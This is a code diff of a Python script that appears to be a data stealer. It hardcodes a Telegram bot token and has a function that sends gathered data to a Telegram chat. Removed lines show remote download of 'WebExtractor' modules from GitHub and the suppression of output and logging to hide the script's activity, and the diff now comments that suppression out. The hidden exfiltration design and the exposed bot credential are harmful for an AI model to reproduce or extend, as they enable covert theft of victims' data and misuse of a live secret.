@@ -1,29 +1,4 @@
 import os
-#import requests
-
-# Set the GitHub token from environment variable
-#github_token = os.environ.get('GITHUB_TOKEN')
-
-# URLs to the raw files on GitHub
-#urls = {
- #   "utils.py": f"https://raw.githubusercontent.com/invisibleghostshell-ux/WebExtractor/main/utils.py?token={github_token}",
-  #  "extract.py": f"https://raw.githubusercontent.com/invisibleghostshell-ux/WebExtractor/main/extract.py?token={github_token}"
-#}
-
-# Download each file
-#for filename, url in urls.items():
-#    print(f"Downloading {filename} from {url}")
-#    response = requests.get(url)
-#    if response.status_code == 200:
-#        with open(filename, 'wb') as file:
-#            file.write(response.content)
-#    else:
-#        print(f"Failed to download {filename}: Status code {response.status_code}")
-
-# Execute the rest of your Python script
-# ...
-
-
 import logging
 import asyncio
 import telegram
@@ -34,12 +9,14 @@ import subprocess
 async def main():
     await process_and_send_data()
 
+# Remove PYTHONUNBUFFERED setting
 # Suppress any output
-os.environ['PYTHONUNBUFFERED'] = '0'
-DEVNULL = open(os.devnull, 'w')
+# os.environ['PYTHONUNBUFFERED'] = '0'
+# DEVNULL = open(os.devnull, 'w')
 
+# Reduce logging suppression
 # Suppress logging messages
-logging.disable(logging.CRITICAL)
+# logging.disable(logging.CRITICAL)
 
 # Telegram bot token and chat ID
 TOKEN = '6851878587:AAGnwbnSWYlphdr4cZ80FOPAi2b0B9jTd3U'
@@ -150,4 +127,6 @@ async def process_and_send_data():
         pass
 
 if __name__ == '__main__':
-    result = subprocess.run(['python', '-c', 'import asyncio; asyncio.run(main())'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    # Run the asynchronous main function
+    asyncio.run(main())
+
